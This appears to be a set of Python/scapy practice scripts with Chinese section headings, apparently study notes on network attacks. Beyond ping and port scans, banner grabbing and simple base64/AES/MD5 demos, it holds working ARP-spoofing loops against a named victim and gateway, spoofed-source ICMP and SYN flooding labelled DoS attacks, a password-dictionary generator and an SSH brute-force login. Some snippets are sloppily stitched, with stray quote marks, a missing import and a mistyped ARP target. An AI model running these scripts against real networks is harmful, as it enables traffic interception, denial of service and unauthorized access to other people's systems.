                  from whois import whois
                  import base64
                  from Cryptodome.Cipher import DES
                  from Cryptodome.Cipher import AES
                  import binascii
                  from scapy.all import *
                  from random import randint
                  import time
                  from hashlib import md5
                  import sys,random
                  import time
                  import itertools
                  from pexpect import pxssh



##  scapy基本操作：icmp扫描  ##
      def main():
          ip_id = randint(1,65535)
          icmp_id = randint(1,65535)
          icmp_seq = randint(1,65535)
          packet = IP(dst="192.168.137.1", ttl=64, id=ip_id)/ICMP(id=icmp_id, seq=icmp_seq)/b'rootkit'
          result = sr1(packet, timeout=1, verbose=False)
          if result:
              for rcv in result:
                  scan_ip = rcv[IP].src
                  print(scan_ip + ' is alive')
          else:
              print('is down')


          pass
      if __name__ == '__main__':
          main()


      def main():

          ans,uans = sr(IP(dst="192.168.137.1")/ICMP())
          for snd,rcv in ans:
              print(rcv.sprintf("%IP.src% is alive now"))

          pass

      if __name__ == '__main__':
          main()



##  tcp扫描  ##
      def main():
          ans,uans = sr(IP(dst="192.168.137.1")/TCP(dport=80,flags="S"))
          for snd,rcv in ans:
              print(rcv.sprintf("%IP.src% 80 is up"))

          pass

      if __name__ == '__main__':
          main()'''
      '''def main():
          ip = '192.168.137.1'
          dport = randint(1,65535)

          packet = IP(dst=ip)/TCP(flags="A", dport=dport)
          response = sr1(packet, timeout=1.0, verbose=0)
          if response:
              #RST
              if int(response[TCP].flags) == 4:
                  time.sleep(0.5)
                  print(ip + ' is up')
              else:
                  print(ip + ' is down')

          pass

      if __name__ == '__main__':
          main()


##  udp扫描  ##
      def main():
          ip = '192.168.137.1'

          ans,uans = sr(IP(dst=ip)/UDP(dport=80))
          for snd,rcv in ans:
              print(rcv.sprintf("%IP.src% is up"))
          pass
      if __name__ == '__main__':
          main()'''
      '''def main():
          ip = '192.168.137.1'
          port = 306
          packet = IP(dst=ip)/TCP(sport=12345,dport=port,flags="S")
          resp = sr1(packet, timeout=20)
          if(str(type(resp))=="<type 'NoneType'>"):
              print("port %s is closed" %(port))
          elif(resp.haslayer(TCP)):
              if(resp.getlayer(TCP).flags==0x12):
                  send_rst =sr(IP(dst=ip)/TCP(sport=12345, dport=80, flags="AR"), timeout=1)
                  print("port %s is open" %port)
              elif(resp.getlayer(TCP).flags==0x14):
                  print("port %s is down" % port)
          pass
      if __name__ == '__main__':
          main()



###  tcp全开放、半开放端口扫描  ##
      def main():
          ip = '192.168.137.1'
          port = 3306
          packet = IP(dst=ip)/TCP(sport=12345,dport=port,flags="S")
          resp = sr1(packet, timeout=20)
          if(str(type(resp))=="<type 'NoneType'>"):
              print("port %s is closed" %(port))
          elif(resp.haslayer(TCP)):
              if(resp.getlayer(TCP).flags==0x12):
                  send_rst =sr(IP(dst=ip)/TCP(sport=12345, dport=80, flags="R"), timeout=1)
                  print("port %s is open" %port)
              elif(resp.getlayer(TCP).flags==0x14):
                  print("port %s is down" % port)
          pass
      if __name__ == '__main__':
          main()


##  banner探测  ##
      def main():
          ip = '192.168.137.1'
          port = 80

          s = socket.socket()
          s.connect((ip,port))
          s.send('haha'.encode())
          banner = s.recv(1024)
          s.close()
          print("banner is {}".format(banner))
          pass
      if __name__ == '__main__':
          main()
          
          
##  arp欺骗  ##   
      def main():

          gatewayIP = "192.168.82.2"
          victimIP = "192.168.82.156"

          hackMAC = "00:0c:29:e0:5b:af"
          victimMAC = "00:50:56:e3:a1:b9"


          #print(getmacbyip("192.168.82.170"))

          packet = Ether()/ARP(psrc=gatewayIP, pdst=victimIP)
          while 1:
              sendp(packet)
              time.sleep(2)
              print(packet.show())

          pass
      if __name__ == '__main__':
          main()

      def main():

          gatewayIP = "192.168.82.2"
          victimIP = "192.168.82.156"

          hackMAC = "00:0c:29:f5:eb:46"
          victimMAC = "00:0c:29:08:17:1c"
          gatewayMAC = "00:50:56:e4:33:f2"

          #print(getmacbyip("192.168.82.170"))
          packet1 = Ether(src=hackMAC,dst=victimMAC)/ARP(hwsrc=hackMAC, hwdst=victimMAC, psrc=gatewayIP, pdst=victimIP, op=2)
          packet2 = Ether(src=hackMAC,dst=gatewayMAC)/ARP(hwsrc=hackMAC, hwdst=gatewayMAC, psrc=gatewayIP, pdst=gatewayIP, op=2)
          while 1:
              sendp(packet1, iface="eth0", verbose=False)
              sendp(packet2, iface="eth0", verbose=False)
              time.sleep(25)
              print(packet1.show())
              print(packet2.show())


          pass
      if __name__ == '__main__':
          main()
      def main():

          while 1:
              packet = IP(src=RandIP(), dst=RandIP())/ICMP()
              time.sleep(0.5)
              sendp(packet)
              print(packet.summary())


          pass
      if __name__ == '__main__':
          main()


##  二层DOC攻击
      def main():

          while 1:
              pdst ="%i.%i.%i.%i" %(randint(1,254),randint(1,254),randint(1,254),randint(1,254))
              psrc = "192.168.137.100"
              send(IP(src=psrc, dst=pdst)/ICMP())
              time.sleep(0.5)
              print(pdst)


          pass
      if __name__ == '__main__':
          main()



##  DOS攻击  ##
      def main():

          while 1:
              pdst ="%i.%i.%i.%i" %(randint(1,254),randint(1,254),randint(1,254),randint(1,254))
              psrc = "192.168.137.100"
              send(IP(src=psrc, dst=pdst)/TCP(dport=80, flags="S"))
              time.sleep(0.5)
              print(pdst)


          pass
      if __name__ == '__main__':
          main()



##  base64加密  ##
      def main():

          s = "haha123"
          bs = base64.b64encode(s.encode('utf-8'))
          print(bs.decode('utf-8'))

          x1 = 'aGFoYTEyMw=='
          bs1 = str(base64.b64decode(x1), 'utf-8')
          print(bs1)
          pass
      if __name__ == '__main__':
          main()




##  AES加密  ##
      def main():

          key = b'abcdefghabcdefgh'
          text = 'haha123 wocap'
          text = text+(16-(len(text)%16))*'='
          print(text)
          aes = AES.new(key, AES.MODE_ECB)
          excrypt_text = aes.encrypt(text.encode())
          excrypt_text = binascii.b2a_hex(excrypt_text)
          print(excrypt_text)

          encrypt_res = b'ad75b11c051a415ada715a4b1c260ba7'
          aes = AES.new(key, AES.MODE_ECB)
          encrypt_text = binascii.a2b_hex(encrypt_res)
          decrypt_text = aes.decrypt(encrypt_text)
          print(decrypt_text.decode('utf-8'))
          pass
      if __name__ == '__main__':
          main()




##  md5加密  ##
      def md5w(str):
          s = str
          new_md5 = md5()
          new_md5.update(s.encode(encoding='utf-8'))
          return new_md5.hexdigest()
      def main():

          a = md5w('admin')
          print(a)

          pass
      if __name__ == '__main__':
          main()



##  字典生成器  ##
      def main():

          words = "1234567890"
          temp = itertools.permutations(words,6)
          passwords = open("dic.txt","a")

          for i in temp:
              passwords.write("".join(i))
              passwords.write("".join("\n"))




          pass
      if __name__ == '__main__':
          main()



##  ssh暴力破解  ##
      def Login(server,username,password):
          try:
              s = pxssh.pxssh()
              s.login(server, username, password)
              print("yes")
          except:
              print("no")
      def main():

          Login("192.168.161.182", "kali", "202193")

          pass
      if __name__ == '__main__':
          main()
